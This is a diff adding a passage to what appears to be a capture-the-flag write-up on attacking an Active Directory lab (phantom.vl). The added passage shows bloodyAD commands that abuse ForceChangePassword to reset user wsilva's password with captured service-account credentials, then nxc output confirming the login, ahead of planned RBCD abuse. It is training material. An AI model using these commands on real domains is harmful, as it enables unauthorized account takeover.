@@ -636,3 +636,20 @@ This user also has ForceChangePassword on three users
 
 All three of these users have AllowedToAct on the DC machine account which means i can abuse RBCD, but only `wsilva` is apart of the group `finmanagers` 
 
+# Compromising `wsilva`
+
+```python
+bloodyAD --host dc.phantom.vl -d phantom.vl -u 'svc_sspr' -p 'gB6XTcqVP5MlP7Rc' set password 'wsilva' 'Password123!'
+[+] Password changed successfully!
+```
+
+Ill change the users password
+
+```python
+nxc smb dc.phantom.vl -u wsilva -p 'Password123!'                                                      
+SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.63   445    DC               [+] phantom.vl\wsilva:Password123!
+```
+
+This user is now compromised, so now ill look at abusing RBCD
+
